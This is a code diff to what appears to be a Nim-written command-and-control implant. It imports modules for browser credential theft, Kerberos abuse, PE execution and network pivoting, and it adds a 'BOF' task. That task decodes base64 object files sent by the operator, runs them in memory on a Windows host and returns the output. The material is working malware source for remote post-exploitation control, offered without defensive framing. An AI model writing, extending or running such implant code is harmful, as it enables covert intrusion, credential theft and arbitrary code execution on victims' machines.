@@ -6,6 +6,7 @@ when defined(windows):
   import winim/lean, winim/inc/tlhelp32
   import kerberos, pe_exec, browsercreds, dotnet
   import rsocks, http_pivot, tcp_pivot
+  import bof
 
 when not defined(windows):
   import std/net
@@ -1930,6 +1931,24 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       except: t.sendResult(id, stopTcpPivot(0), "")
     else:
       t.sendResult(id, "", "TCP_PIVOT_STOP: not supported on Linux yet")
+
+  of "BOF":
+    when defined(windows):
+      try:
+        let j        = parseJson(args)
+        let coffB64  = j{"coff_b64"}.getStr()
+        let argsB64  = j{"args_b64"}.getStr()
+        if coffB64 == "":
+          t.sendResult(id, "", "BOF: missing coff_b64"); return
+        let coffStr  = base64.decode(coffB64)
+        let coffBytes = cast[seq[byte]](coffStr)
+        let argStr   = if argsB64.len > 0: base64.decode(argsB64) else: ""
+        let argBytes = cast[seq[byte]](argStr)
+        let output   = bofExec(coffBytes, argBytes)
+        t.sendResult(id, output, "")
+      except: t.sendResult(id, "", "BOF: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "BOF: not supported on this platform")
 
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
